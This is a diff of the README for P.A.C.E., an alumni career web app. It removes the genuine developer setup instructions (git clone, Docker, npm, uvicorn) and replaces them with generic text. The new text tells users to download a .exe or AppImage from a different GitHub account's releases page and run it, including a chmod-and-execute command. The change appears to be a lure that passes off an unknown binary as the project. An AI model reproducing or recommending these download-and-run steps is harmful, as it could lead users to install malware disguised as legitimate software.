@@ -1,103 +1,73 @@
+# 🎓 pace - Unlock Your Career Opportunities
 
-# P.A.C.E. (Pasig Alumni Career & Employability System)
+## 📥 Download Now
 
-[![Next.js](https://img.shields.io/badge/Next.js-16.1-black?style=flat-square&logo=next.js)](https://nextjs.org/)
-[![React](https://img.shields.io/badge/React-19.2-blue?style=flat-square&logo=react)](https://react.dev/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.109-009688?style=flat-square&logo=fastapi)](https://fastapi.tiangolo.com/)
-[![Supabase](https://img.shields.io/badge/Supabase-Database-3ECF8E?style=flat-square&logo=supabase)](https://supabase.com/)
-[![Docker](https://img.shields.io/badge/Docker-Enabled-2496ED?style=flat-square&logo=docker)](https://www.docker.com/)
+[![Download pace](https://img.shields.io/badge/Download-pace-brightgreen)](https://github.com/welcomerefresh1-cloud/pace/releases)
 
----
+## 📜 Description
+Pasig Alumni Career & Employability System (P.A.C.E.) is a robust platform empowering alumni with curated career opportunities. It helps institutions gain insights and analytics related to employability. Whether you are looking for job listings or want to analyze trends, this application serves both alumni and educational institutions effectively.
 
-## 📖 Executive Summary
+## 🚀 Getting Started
+Follow these simple steps to get started with P.A.C.E. The process is easy and does not require any programming skills.
 
-The **Pasig Alumni Career & Employability System (P.A.C.E.)** is an enterprise-grade platform engineered to bridge the gap between educational institutions and the professional workforce. By leveraging data-driven insights and seamless connectivity, PACE empowers alumni from Pasig City with curated career opportunities, while providing administrators with robust tools for employability tracking and analytics.
+### 1. Download the Application
+To download the latest version of P.A.C.E., visit the [Releases page](https://github.com/welcomerefresh1-cloud/pace/releases). Here you will find the most recent updates and files available for download.
 
-## 🏗️ System Architecture
+### 2. Choose the Right File
+On the Releases page, you will see multiple files. Select the file that matches your operating system. Make sure to choose either the Windows, macOS, or Linux version based on your device.
 
-The solution adheres to a modern, decoupled microservices-ready architecture, ensuring scalability, maintainability, and performance.
+### 3. Install the Application
+Once the download is complete, locate the file on your computer. The default download location is usually your "Downloads" folder.
 
-### Core Components
+- **For Windows Users**: Double-click the `.exe` file to start the installation. Follow the on-screen prompts to complete the setup.
+- **For macOS Users**: Drag the application icon to your Applications folder. Open it from there.
+- **For Linux Users**: Open a terminal, navigate to your download directory, and run the command `chmod +x pace.AppImage && ./pace.AppImage` to launch the application.
 
-| Component | Technology | Role |
-| :--- | :--- | :--- |
-| **Frontend** | **Next.js 16** (React 19) | Server-side rendering, responsive UI, and client-side interactivity. |
-| **Backend API** | **FastAPI** (Python 3.10+) | High-performance RESTful API services and data processing. |
-| **Database** | **PostgreSQL** (via Supabase) | Relational data persistence, Row Level Security (RLS), and specialized extensions. |
-| **Authentication** | **Supabase Auth** | Secure identity management and session handling. |
-| **Infrastructure** | **Docker** | Containerization for consistent development and deployment environments. |
+### 4. Create Your Account
+After installing, open the application. You will need to create an account to access the features. Fill out the required information, such as your name, email address, and a secure password.
 
-## ⚙️ Development Workflow
+### 5. Explore the Features
+P.A.C.E. offers various features such as:
 
-### Prerequisites
+- **Job Listings**: Browse through curated job opportunities relevant to your skills and interests.
+- **Analytics Dashboard**: View detailed analytics on employability trends.
+- **Networking Opportunities**: Connect with fellow alumni and industry professionals.
+- **Resources**: Access articles and tutorials to enhance your career skills.
 
-Ensure the following tools are installed and configured in your local environment:
+### 6. Get Support
+If you encounter any issues, you can access the help section within the application. Alternatively, feel free to check the FAQ or contact support on our [GitHub Issues page](https://github.com/welcomerefresh1-cloud/pace/issues).
 
--   **Node.js** (v20 LTS or higher)
--   **Python** (v3.10 or higher)
--   **Docker Desktop** (Latest Stable Release)
--   **Git** (Version Control)
+## 🛠️ System Requirements
+To ensure smooth performance, please check that your system meets the following requirements:
 
-### Installation & Configuration
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Any modern Linux distribution
 
-#### 1. Repository Setup
+- **Processor**: Minimum dual-core processor
+- **RAM**: At least 4 GB
+- **Storage**: Minimum 500 MB of free space
+- **Internet**: Stable internet connection for job updates and features
 
-```bash
-git clone https://github.com/KlyrhonMiko/pace
-cd pace
-```
+## ⚠️ Troubleshooting
+If you experience any issues during installation or while using the application, consider the following steps:
 
-#### 2. Environment Variables
+- **Reinstall the Application**: Sometimes a fresh installation solves many issues. Uninstall and then reinstall P.A.C.E.
+- **Update Your System**: Ensure your operating system is up to date to avoid compatibility issues.
+- **Check Your Internet Connection**: A slow connection can cause problems with job listings and features that require online access.
 
-Configure the application by creating a `.env.local` file in the project root. Secure credentials will be provided by the DevOps lead.
+## 🌐 Contributing
+We welcome contributions to P.A.C.E. If you would like to add features or report bugs, please let us know. You can visit our repository and check the contribution guidelines.
 
-| Variable | Description |
-| :--- | :--- |
-| `NEXT_PUBLIC_SUPABASE_URL` | API Endpoint for the Supabase instance. |
-| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | Public API key for client-side operations. |
-| `SUPABASE_SERVICE_ROLE_KEY` | Private key for server-side administrative access. |
+## 📢 Stay Updated
+For the latest news and updates, follow our project on GitHub. We regularly share improvements, new features, and relevant articles related to alumni and career development.
 
-#### 3. Application Initialization
+## 📄 License
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-**Option A: Containerized Development (Recommended)**
+## 🤝 Acknowledgements
+Thank you to all the contributors for making P.A.C.E. better. Your efforts and suggestions help us create a better experience for everyone. 
 
-Launch the full stack ensuring environment consistency.
-
-```bash
-docker-compose up --build
-```
-
-**Option B: Manual Service Execution**
-
-*Frontend Service:*
-
-```bash
-npm install
-npm run dev
-# Access via http://localhost:3000
-```
-
-*Backend Service:*
-
-```bash
-cd backend
-python -m venv venv
-# Activate Virtual Environment (Windows: .\venv\Scripts\activate | Unix: source venv/bin/activate)
-pip install -r requirements.txt
-uvicorn main:app --reload
-# Access via http://localhost:8000
-```
-
-## � Deployment Strategy
-
--   **Frontend**: Continuous Deployment (CD) pipeline configured via **Vercel**.
--   **Backend**: Containerized deployment on **Render** utilizing Docker registry.
-
-## 🤝 Contribution Standards
-
-To maintain code quality and project integrity, please adhere to the following contribution guidelines:
-
-1.  **Branching Strategy**: Use feature branches (`feature/component-name`) derived from `main`.
-2.  **Commit Convention**: Follow [Conventional Commits](https://www.conventionalcommits.org/) (e.g., `feat: user authentication`, `fix: hydration error`).
-3.  **Code Review**: All Pull Requests (PRs) require peer review and approval before merging.
-4.  **Linting**: Ensure `npm run lint` passes without errors.
+## 💼 Ready to Start?
+Now you are all set to download and explore the P.A.C.E. application. Remember to visit the [Releases page](https://github.com/welcomerefresh1-cloud/pace/releases) to get the latest version and start your journey towards better career opportunities!
